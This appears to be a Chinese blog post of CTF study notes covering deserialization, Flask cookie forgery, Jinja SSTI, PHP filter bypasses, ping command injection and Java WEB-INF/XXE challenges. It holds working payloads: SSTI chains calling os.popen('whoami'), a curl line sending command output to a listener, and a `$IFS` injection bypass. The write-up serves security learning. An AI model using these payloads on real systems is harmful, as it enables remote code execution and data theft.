# XD安全 学习笔记 | CTF夺旗

原创 凯 [0x00实验室](javascript:void(0);) *2021-08-28 08:15*

收录于合集

\#学习笔记3个

\#渗透测试9个

\#小迪安全笔记20个

声明

作者：团队成员-凯 【无名安全团队】

如需转载文章，请标明来源即可。



day83-85天学习笔记

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDa00ejF45UXkLggfZTK8TEwTnSaicIyH2W4UIXTR3XbwN5icbPlcUS49w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**序列化：**

**序列化是将对象的状态信息转换为可以存储或传输的形式的过程。**



**靶场****:**

**华北赛区****Day1 Web2 Writeup** 

**
**

**开启靶机**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDKOetbm94WN3BfT4RfpGxATxKqXceAmfdtiaCb0Mic6xdCRgaKcFXQB1w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**看到提示找到****v6****，使用脚本**

- 
- 
- 
- 
- 
- 
- 

```
import requests url = "http://web44.buuoj.cn/" for i in range(1, 2000):   r = requests.get(url + "shop?page=" + str(i))   if r.text.find("lv6.png") != -1:   print(i)   break
```

**发现在****181****页**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zD8PibywicJF4cicChvMbwAhJbjbykia06Tic4v0ZlYaGAjIMvrlVPoIKQ2mQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**购买商品发现钱数不够，但在前端页面可以更改折扣卷**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDEbxqKFCYavFde9DQG1oxjhjdrVT01LJ9a9dlszlHiaM8WFfInLnFcnQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**操作完成后提示**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDPZdib4OjBFh9ziaXRicUH9c8TCzicfXbapic7NzDCaS2elricV8un2qCibkicQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**抓包发现****wtf**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDiah8qzWjFCIJ0SUGAWc23HshS7It7mkjMQsT7m6iaPT1EEiaibL1TXZmCw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)





**跑出来的密钥****”1kun“**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zD9THtEFL0ScJZjKP9E9ibkoriaz3uCzLv63diarJjicoQBJrt7AlngfKF9g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**cookie****伪造成功**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDIn6vicRqClxDQDhukeVjdsaF354Jxuvagwfomk0lmibMIvty2jnB2NmA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



查看页面源代码发现有一个文件，进行下载，发现代码中有序列化构造payload

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDPbLYLqYKib12963Wib5Edibcw7DuQrc78goDgJCQ4MJ4Dvl9QOO2UWHyA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

查看你刚才那个页面，将输入框的 hidden 属性删掉，将 payload 粘进去提交。flag成功显示





**SSTI:**

**SSTI(Server-Side Template Injection)** **服务端模板注入，就****是服务器模板中拼接了恶意用户输入导致各种漏洞。**



1.ssti漏洞的检测

比如发送{{7*7}}返回49

2.漏洞利用

通过某种类型(字符串:""，list:[]，int：

  1)开始引出，class找到当前类，mro或者base找到object，前边的语句构造都是要找这个。然后利用object找到能利用的类。

config.items()可以查看服务器的配置信息

class返回调用参数类型

base返回基类

mro 返回一个tuple对象，其中包含了当前类对象所有继承的基类，tuple中元素的顺序是MRO（Method Resolution Order） 寻找的顺序。

subclasses()对每个new-style class“为它的直接子类维持一个弱引用列表”，之后“返回一个包含所有存活引用的列表” ，返回子类''.

class.mro[2] <class ‘object’>''.

class.mro[2].subclasses() 查看所有模块''.

class.mro[2].subclasses()[71].init.globals来找os类下的，init初始化类，然后globals全局来查找所有的方法及变量及参数



**靶场****:[WesternCTF2018]shrine 1**

**启动靶场**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDW8erg4rIJ7zshhEAibiaLaoGbe9o418cB9aNAQNfick2tr0WuJOvYltYA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**使用****tplmap****工具发现有过滤**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDib6UVenGqs6jKUdNDgywKYoKLmrfqque8iaicYDLAr9p8XE11p5wfk1nw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**查看源代码是对****()****进行了过滤，这使得很多语句无法使用，使用****url_for()****绕过**

- 
- 

```
http://d8e25c11-b61d-47c0-b8b5-1078aa2e2283.node4.buuoj.cn:81/shrine/%7B%7Burl_for._globals_%7D%7Dhttp://d8e25c11-b61d-47c0b8b1078aa2e2283.node4.buuoj.cn:81/shrine/%7B%7Burl_for._globals_['current_app'].config%7D%7D
```



**绕过****绕过中括号**

#通过__bases__.__getitem__(0)（__subclasses__().__getitem__(128)）绕过__bases__[0] （__subclasses__()[128]） #通过__subclasses__().pop(128)绕过__bases__[0]（__subclasses__()[128]） "".__class__.__bases__.__getitem__(0).__subclasses__().pop(128).__init__.__globa ls__.popen('whoami').read()

{% set chr= ().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(250).__init__ .__globals__.__builtins__.chr %}{{().__class__.__bases__[0].__subclasses__() [250].__init__.__globals__.os.popen(chr(119)%2bchr(104)%2bchr(111)%2bchr(97)%2bc hr(109)%2bchr(105)).read()}}

**绕过中括号****+****逗号**



**绕过双大括号**

{% if ''.__class__.__bases__.__getitem__(0).__subclasses__().pop(250).__init__.__globa ls__.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %}1{% endif %}

**python2****下的盲注**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDmNjNxSZENzhVULicy8bSxD0ntSdYg7ZiaDWKLTNbFPsywQQXsYoicHCoQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**Python Web****之****flask session**

**%****操作符**

- 
- 
- 

```
>>> name = 'Bob' >>> 'Hello, %s' % name "Hello, Bob"
```

**第二种：****string.Template**

使用标准库中的模板字符串类进行字符串格式化。

- 
- 
- 
- 
- 

```
>>> name = 'Bob' >>> from string import Template >>> t = Template('Hey, $name!') >>> t.substitute(name=name) 'Hey, Bob!'
```

**第三种：调用****format****方法**

python3后引入的新版格式化字符串写法，但是这种写法存在安全隐患。

存在安全隐患的事例代码：

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkgh88L0UCmE1CPpJ6YicdInRIWTukAahiaVLK5pVVd6SMbbSiaR5KuMlnw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

从上面的例子中，我们可以发现：如果用来格式化的字符串可以被控制，攻击者就可以通过注入特殊变量，带出敏感数据。



**第四种****:f-Strings**

这是python3.6之后新增的一种格式化字符串方式，其功能十分强大，可以执行字符串中包含的python表达式，安全隐患可想而知。

- 
- 
- 
- 
- 
- 

```
>>> a , b = 5 , 10 >>> f'Five plus ten is {a + b} and not {2 * (a + b)}.' 'Five plus ten is 15 and not 30.' >>> f'{__import__("os").system("id")}' uid=0(root) gid=0(root) groups=0(root) '0'
```



------

**CTF****-php**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkGcX6lIDMM0jRfklfVknaXQuwNMVK2vAiagXvq7aAMg1LN00oCU0wnpg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**弱类型与强类型：**

**强类型指的是强制数据类型的语言，就是说，一个变量一旦被定义了某个类型，如果不经过强制类型转****换，这个变量就一直是这个类型，在变量使用之前必须声明变量的类型和名称，且不经强制转换不允许****两种不同类型的变量互相操作。我们称之为强类型，而弱类型可以随意转换变量的类型例如可以这样：**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkCFGEiapRsMqn9THvFaSSiby5Jbibz2rndibIfibGfymAZBJnulBVR4ofvqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**靶场：**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibk2uvtGOgTdvqZEt0j1wOMcXXMuiaLMnhBqgBQwYO7cCJfictuECwM5tiaw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**通过代码分析发现只要****num****和****1****相等便可以得到**

**flag.**http://123.206.87.240:8002/get/index1.php/?num=1x

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkibvXnic0yKc5mRFDLT0XjdOZicJ8UUA9N5amb4bQTUq66Jl69HjnVUjpA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**preg_match****绕过：**

**异或：****在****PHP****中两个字符串异或之后，得到的还是一个字符串**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkxL5kjQkuYWIbKXfxJ6qxoZHQLeibnvWLDjSgDDaw25BJHyOfzK1GmJQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**取反：****将函数取反然后用****url****编码表示**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkwUMBp2EzhzaILkknVK6hlnicS5eyXBLg4OHoh7bGBa1w0aQnd4VqUgA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**数组：****preg_match****只能处理字符串，当传入的****subject****是数组时会返回****false**



**PCRE****：**

**PHP****利用****PCRE****回溯次数限制绕过某些安全限制****给****pcre****设定了一个回溯次数上限，默认为****1000000****，如果回溯次数超过这个数字，****preg_match****会返回****false**

**
**

***\*换行符\****

***\*靶场：\**\**hate_php\****

***\*根据代码我们可知已经对\**\**\,",'\**\**等多种符号进行了过滤所以无法使用异或，同时\**\**get_defined_function\**\**对\**\**php\**\**里的一些函数也进行了过滤\****

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibknaN4ZjdQ7M1V9aYm8wRx1Q1qblreyn2ZaZxB1Tdx7KiaJ6N7osWJpqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**对****highlight_file** **和** **flag.php****取反并进行****url****编码**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkcOwpyl3u3QibQqqTzMNhgQKjtV14g09ic5EBfVicTkOmIoftAorSjKXBQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibk2l5AEAZaRZQSU9Vror2rE9No2CibYXpkPrLxd5XnwrbEdG3fP0icGm8g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**RCE:**

**靶场：****buuctf-ping ping ping**

**开启靶场后发现可以用系统命令去执行代码，并且用大小写测试发现是****linux****操作系统**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkRgxJUiagI2sY1qvia1nH03DZUmhdwmIknWDiaTUbUgBCVYW81ibK3V4qOQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**对空格和****flag.php****都进行限制**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkWIyTTeammsMN7QsjdMt5FWiam850ryA6O97Cd74yOx9T6yFWM8STCPA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**/?ip=127.0.0.1;a=g;cat$IFS$2fla$a.php** **内量拼接绕过**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkOM833Pibia5VOjq3Ftnj2zUKRdTupGfPXyxo0u2Cn7kYbdf2ZlASudYQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**反序列化：****靶场代码如下**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibk27Ks6fvTyEnLtR22g6uwf64D6KLWtHiaibb25GWaPu1WtLnxP43KrZ8Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkeNjj3vxl0CNNWkTQAtxMSI03ibrmEibMrVFKT83vpFfR7f43moHptSBw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkyKJ3CGpZBiayTVFwMltdhibwspcHnHMSz6PLBVwiayuHjVBkXJS1hYGpA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkDKXDnJHiciaErr4Y2TEicZu2vBzxZib1d0vaibC1H8FzmkOtDMw8vMGJvQw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**利用****php>7.1****版本对类属性的检测不严格****(****对属性类型不敏感****)**

**正常构造****payload****的话因为****op****、****op****、****fliename****、****$content****都是****protected****属性，序列化的的结果的属****性名前面会有****/00/00(****或者****%00%00)****，****/00****的****ascii****为****0****不可见的字符如下图，就会被****is_valid****方法拦下****来。**

**可以将****protected****换为****public****传入****str****，经过处理反序列化。****is_valid****过滤：传入的****string****要是可见字符****ascii****值为****32-125****。****$op****：****op=="1"****的时候会进入****write****方法处理，****op=="2"****的时候进入****read****方法处理。****===****值相等，类型相****等**

**
**

***\*构造\**\**payload:\****

***\*class FileHandler {\**\**public op=" 2"\**\**pubilic fielname=flag.php\**\**public content\**\**} \*\*$A=NEW FileHandler\*\*\*\*$a=serialize($A)\*\*\*\*echo($a)\*\**\***



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkyp5ibKUPalO39G8glgibiadTXTNovJ38nPCs08yvgCiarkpBnqdZ6ZcpKA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkCZ6bSMuBAwxyNSqbMlEDuQCq3icvJnTF2SjjY1Ocj0wv15kKT9ib6jvQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

***\*
\****

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkUvMicVIxAW5Qf9f1q8DRFcbjbVusr9yibyBxj0kP8S0flM2NE1xr9Hww/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



------

**CTF-java**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkafibnnZygdKQDqzdM0le1Bxn9A82zibavzIWn3pboL05yibh1SKCmbwvQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**java****常考以及出题思路：**

**xee,spl****表达式，反序列化，文件安全，最新框架插件漏洞**

**
**

**必备知识点：**

**反编译，基础的****Java****代码认知以及审计能力，熟悉相关最新的漏洞，常见漏洞**

**
**

**java****简单逆向解密****靶场：**

**java****逆向解密**

**开启之后下载文件，用****idea****打开**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkdhOCOEurSibHicvmstJyZYCYYbyHdoXva9sIW2ga7oGrDp41OaqyXdlg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



***\*观察代码后发现可以逆向得到\**\**flag\****

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibk6Ttg2pEPaVibRniaunALzR8jugQLoLcsbDHwNyz3TRfG3FiceE6SmofoQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**编写脚本，成功得到****flag**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkFjSVeL2b9dGpExBTq9eapAPuGZXyRP7S1KXvaIsVePI8eicWrEPLIPw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**web-INF**

**WEB-INF** **主要包含一下文件或目录：**

**/WEB-INF/web.xml****：****Web** **应用程序配置文件，描述** **servlet** **和其他的应用组件配置及命名规则。**

**/WEB-INF/classes/****：含了站点所有用的** **class** **文件，包括** **servlet class** **和非** **servlet class****，他们不****能包 含在** **.jar** **文件中** 

**/WEB-INF/lib/****：存放** **web** **应用需要的各种** **JAR** **文件，放置仅在这个应用中要求****使用的** **jar** **文件****,****如数 据库驱动** **jar** **文件****/WEB-INF/src/****：源码目录，按照包名结构放置各个** **java** **文件。** 

**/WEB-INF/database.properties****：****数据库配置文件 漏洞检测以及利用方法：通过找到** **web.xml** **文件，推断** **class** **文件的路径，最后直接****class** **文件，在 通过反编译** **class** **文件，得到网站源码**

**
**

**靶场：**

**[RoarCTF 2019]Easy Java****开启靶场时有页面有一个****help,****并且打开后****url****呈现****filename=?,****由此可知可能含有文件上传漏洞**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkmdL5xeSsfy53nFjfaD2oIiaXJgJ15ibm6a2ujdfhKZwiaDxEicSayzLTiaw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**以****post****的方式提交****filename=/WEB-INF/web.xml**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkn20jWexxEZANoX5tLCHcdZRYcvmTR99KGsKXSNhEuLqLtRPwF8KEiaw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**
**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibksIkeOJVib48pKOIHt4ibDpUE3wBCmYjyF8LZDVVn9doy7TiaPLufic1KEg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkmeava002r6zKxPl3oeTLjzzSRJsqRkKpOMIFa8eXlrSSPvaa53e6Bg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



flag在

com/ctf/FlagControllerfilename=/WEB-INF/classes/com/wm/ctf/FlagController

在经过base64解密得到flag



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibk40rreA7QlaW0GAicuUAIdJGegvjJtwsWq7WRmyzHDlM8TXNSpXiaac5Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**配置源码**

**靶场：****网鼎杯** **2020-****青龙组****-filejava-ctfhub****上传图片抓包后发现有****filename,**

**由此判断可能存在文件上传漏洞**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibk8eFwibk27PeRfS6rZ1boDuGVlwAbAJ64KnMEPSMgZA7iavAbn1MOdY2Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**写入****/WEB-INF/web.xml****发现文件被删除，这里可能存在检测可以使用****../****绕过**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkHrCM9iazIZ8HiazOnWblTiaiclv2FSmqLaOcRHWJojx7IwvariaQSN6jkCA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**将存在的文件进行下载，代码审计** **Javaweb** **代码，发现** **flag** **位置，文件下载获取？过滤，利用漏洞****xxe** **安全，构造****payload**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkdbxmCkZ4f5jJUibiatMFJTeuFKHyUQHFxWiaBgibAMqEdLQjL0bUBmJiaMA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)